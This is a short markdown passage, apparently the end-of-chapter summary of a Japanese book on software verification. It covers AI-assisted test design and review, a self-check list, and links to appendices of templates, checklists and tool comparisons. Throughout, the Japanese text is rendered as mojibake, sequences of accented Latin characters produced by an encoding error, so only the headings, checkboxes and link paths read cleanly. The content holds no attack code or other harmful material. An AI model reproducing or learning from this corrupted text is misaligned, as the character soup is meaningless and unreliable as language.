- AIè‡ªèº«ã‚’ãƒ†ã‚¹ãƒˆè¨­è¨ˆãƒ»ãƒ†ã‚¹ãƒˆç”Ÿæˆãƒ»ãƒ¬ãƒ“ãƒ¥ãƒ¼ã«æ´»ç”¨ã™ã‚‹ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’ç´¹ä»‹ã—ã€äººé–“ã¨AIãŒå”èª¿ã—ã¦æ¤œè¨¼ã‚’è¡Œã†æ çµ„ã¿ã‚’æç¤ºã—ãŸã€‚
- å€‹ã€…ã®æŠ€æ³•ã‚’ãƒãƒ©ãƒãƒ©ã«é©ç”¨ã™ã‚‹ã®ã§ã¯ãªãã€ãƒ†ã‚¹ãƒˆæˆ¦ç•¥ã¨æ•´åˆã—ãŸå½¢ã§çµ±åˆçš„ã«çµ„ã¿åˆã‚ã›ã‚‹ã“ã¨ã®é‡è¦æ€§ã‚’å¼·èª¿ã—ãŸã€‚

### ã“ã®ç« ã‚’èª­ã¿çµ‚ãˆãŸã‚‰ç¢ºèªã—ãŸã„ã“ã¨

- [ ] ç¾åœ¨ã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã§ä½¿ç”¨ã—ã¦ã„ã‚‹æ¤œè¨¼æŠ€æ³•ï¼ˆé™çš„è§£æãƒ„ãƒ¼ãƒ«ã€ãƒ†ã‚¹ãƒˆãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ç­‰ï¼‰ã‚’åˆ—æŒ™ã—ã€æœ¬ç« ã§ç´¹ä»‹ã•ã‚ŒãŸãƒ‘ã‚¿ãƒ¼ãƒ³ã¨å¯¾å¿œã¥ã‘ã‚‰ã‚Œã‚‹ã‹ã€‚
- [ ] AI ã‚’ãƒ†ã‚¹ãƒˆè¨­è¨ˆã‚„ãƒ†ã‚¹ãƒˆçµæœåˆ†æã«æ´»ç”¨ã§ããã†ãªãƒã‚¤ãƒ³ãƒˆã‚’ 1ã€œ2 ç®‡æ‰€æŒ™ã’ã€ãã®ãƒ¡ãƒªãƒƒãƒˆãƒ»æ‡¸å¿µç‚¹ã‚’æ•´ç†ã§ãã‚‹ã‹ã€‚
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚„æ€§èƒ½ãªã©ã®éæ©Ÿèƒ½è¦ä»¶ã«ã¤ã„ã¦ã€ã©ã®æ¤œè¨¼æŠ€æ³•ã§ã‚«ãƒãƒ¼ã—ã¦ã„ã‚‹ã‹ï¼ã™ã¹ãã‹ã‚’è¨€èªåŒ–ã§ãã‚‹ã‹ã€‚

### é–¢é€£ã™ã‚‹ä»˜éŒ²ãƒ»ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ

- æ¤œè¨¼è¨ˆç”»ã‚„ãƒ†ã‚¹ãƒˆé …ç›®è¡¨ã‚’ä½œæˆã™ã‚‹éš›ã¯ã€[ä»˜éŒ²A ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆé›†](../appendices/appendix-a-templates/) ã®æ§‹æˆã‚’å‚è€ƒã«ã€è‡ªãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå‘ã‘ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’æ•´å‚™ã™ã‚‹ã¨ã‚ˆã„ã€‚
- AIç”Ÿæˆã‚³ãƒ¼ãƒ‰ãƒ¬ãƒ“ãƒ¥ãƒ¼ã‚„ãƒ†ã‚¹ãƒˆçµæœç¢ºèªã®è¦³ç‚¹æ•´ç†ã«ã¯ã€[ä»˜éŒ²B ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ](../appendices/appendix-b-checklists/) ãŒæœ‰ç”¨ã§ã‚ã‚‹ã€‚
- åˆ©ç”¨ä¸­ãŠã‚ˆã³å°å…¥æ¤œè¨ä¸­ã®æ¤œè¨¼ãƒ„ãƒ¼ãƒ«ã®æ¯”è¼ƒã«ã¯ã€[ä»˜éŒ²C ãƒ„ãƒ¼ãƒ«æ¯”è¼ƒè¡¨](../appendices/appendix-c-tool-comparison/) ã‚’å‚ç…§ã—ã€ç‰¹æ€§ã‚„å°å…¥ã‚³ã‚¹ãƒˆã‚’æ•´ç†ã—ã¦ã»ã—ã„ã€‚
